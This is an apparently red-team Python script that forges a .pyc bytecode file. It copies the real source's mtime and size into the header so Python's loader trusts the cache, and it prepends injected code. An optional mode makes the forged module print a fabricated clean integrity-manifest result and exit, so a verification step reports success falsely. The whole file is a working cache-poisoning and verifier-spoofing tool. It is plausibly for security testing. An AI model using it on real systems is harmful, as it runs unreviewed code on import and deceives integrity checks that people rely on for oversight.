#!/usr/bin/env python3
"""Forge a .pyc from a .py source plus an injected marker print.

Rebuilt from scratch (the /tmp/y13r2-redteam/forge_pyc.py is lost).
The forged .pyc carries the real source's mtime/size in its
16-byte header (magic + flags 0 + mtime + size), so the loader
trusts it; the marshalled code object is compiled from the source
with the marker prepended, so the marker executes when the .pyc
is loaded as __main__ or imported.

Usage:
  python3 forge_pyc.py SRC_PY TAG OUT_PYC [--fake-ok]
  python3 forge_pyc.py SRC_PY TAG OUT_PYC --fake-ok --manifest-md5 MD5

--fake-ok: the forged code prints a clean verify JSON (manifest_ok
true) and exits 0 before the real source runs, so a -m/import load
of the forged entry .pyc makes --verify-manifest lie (the A2b
shape). Without it the marker print is prepended and the real
source then runs (its -m guard fires, deletes the entry .pycs,
exits 2).

The marker is always printed first: POISON-MARKER <tag>. Never
writes outside the given OUT_PYC path. Never touches /usr/lib.
"""
import importlib.util
import marshal
import os
import struct
import sys


def forge(src_path, tag, out_path, fake_ok=False, manifest_md5=""):
    with open(src_path, "rb") as f:
        src = f.read()
    marker = f'print("POISON-MARKER {tag}")\n'.encode()
    if fake_ok:
        fake = ('print(\'{"manifest_ok": true, "files_checked": 27, '
                '"mismatches": [], "manifest_md5": "'
                + manifest_md5 + '"}\')\n'
                'import sys; sys.exit(0)\n').encode()
        code_src = marker + fake + src
    else:
        code_src = marker + src
    code = compile(code_src, src_path, "exec")
    st = os.stat(src_path)
    header = (importlib.util.MAGIC_NUMBER
              + struct.pack("<I", 0)
              + struct.pack("<I", int(st.st_mtime))
              + struct.pack("<I", len(src)))
    data = header + marshal.dumps(code)
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, "wb") as f:
        f.write(data)
    print(f"forged {out_path} ({len(data)} bytes, "
          f"mtime {int(st.st_mtime)}, size {len(src)}, "
          f"tag {sys.implementation.cache_tag}, fake_ok={fake_ok})")
    return out_path


def main(argv):
    if len(argv) < 4:
        print(__doc__, file=sys.stderr)
        return 2
    src_path, tag, out_path = argv[1], argv[2], argv[3]
    fake_ok = "--fake-ok" in argv
    md5 = ""
    if "--manifest-md5" in argv:
        md5 = argv[argv.index("--manifest-md5") + 1]
    forge(src_path, tag, out_path, fake_ok=fake_ok, manifest_md5=md5)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
